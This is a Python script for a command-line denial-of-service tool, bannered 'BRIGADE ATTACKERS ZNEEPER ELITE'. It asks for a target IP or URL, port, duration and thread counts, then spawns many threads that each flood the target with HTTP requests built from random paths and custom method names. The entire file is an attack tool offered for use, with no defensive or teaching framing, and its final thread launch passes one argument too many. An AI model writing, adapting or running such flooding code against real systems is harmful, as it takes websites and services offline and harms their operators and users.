# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . .")
    exit()

# DEF & CLASS

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def status_print(ip,port,thread_id,rps,path_get):
    time.sleep(1)
    print(f"{Fore.YELLOW} [ H A Q ]{Fore.LIGHTYELLOW_EX}  Attack {Fore.WHITE}Http {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.RESET}")
    print(f"{Fore.GREEN} [ H A Q ]{Fore.LIGHTBLUE_EX}  Attack{Fore.WHITE} {path_get} {Fore.CYAN} SCRAPE{Fore.BLUE}{rps}{Fore.LIGHTCYAN_EX}ID ⟩:::...{Fore.RED}{thread_id}{Fore.RESET}")
def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,id,booter_sent):
    rps = 0
    url_path = ''
    path_get = ['SYN_FLOOD','CHOIS_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "SYN_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
            rps += 2
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass
    status_print(ip,port,id,rps,path_get_loader)

status_code = False
id_loader = 0
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent):
    global status_code,id_loader
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                id_loader += 1
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,id_loader,booter_sent))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()

#DATA
banner = f"""
{Fore.BLUE}████████▒▒ ██▒▒        ████▒▒     ███▒▒  ██████▒▒
{Fore.BLUE}██▒▒       ██▒▒      ██▒ ██▒▒  ██▒  ██▒▒██▒▒  ██▒▒
{Fore.BLUE}██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
{Fore.BLUE}██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
{Fore.CYAN}██████▒▒   ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
{Fore.CYAN}██▒▒       ██▒▒      ██▒   ██▒▒  ██▒▒██▒▒ ██▒▒ ██▒▒
{Fore.CYAN}██▒▒       ████████▒▒ ████▒▒     ████▒▒   ██████▒▒
{Fore.CYAN}▒▒▒        ▒▒ ▒▒ ▒▒   ▒▒ ▒▒      ▒ ▒▒     ▒▒▒▒▒
{Fore.CYAN}▒▒          ▒ ▒ ▒      ▒ ▒        ▒▒        ▒▒
{Fore.RED}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{Fore.RED}┣{Fore.WHITE}            BRIGADE ATTACKERS ZNEEPER ELITE
{Fore.RED}┣{Fore.GREEN}                     INTERNAL SCRIFT
{Fore.RED}┣{Fore.YELLOW}                       BY: KF'24
{Fore.RED}┣{Fore.BLUE}                          —oO0Oo—
{Fore.RED} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Fore.YELLOW}# (OFFLINE) {Fore.LIGHTYELLOW_EX}TOOL v2 #{Fore.RESET}"""

print(banner)
host = ""
ip = ""
print(f"{Fore.LIGHTWHITE_EX}PYF OWN1-5")
data_type_loader_packet = input(F"{Fore.WHITE}TYPE PACKET (DEFAULT=PYF EXAMPLE=OWN1)>").upper()
target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
port_loader = int(input(f"{Fore.YELLOW}PORT>"))
time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=250)>"))
spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 EXAMPLE=299)>"))
create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=50)>"))
booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=500 EXAMPLE=65536)>"))
print(f"{Fore.LIGHTCYAN_EX} EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD DELETE OPTIONS TRACE")
print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> PANOS MIRAI EXPLOIT LOGSHELL SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>").upper()
spam_create_thread = int(input(F"{Fore.LIGHTBLACK_EX}SPAM CREATE THREAD (DEFAULT=5 EXAMPLE=15)>"))
print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    
    for _ in range(spam_create_thread):
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}TRYING SENT . . .{Fore.RESET}")
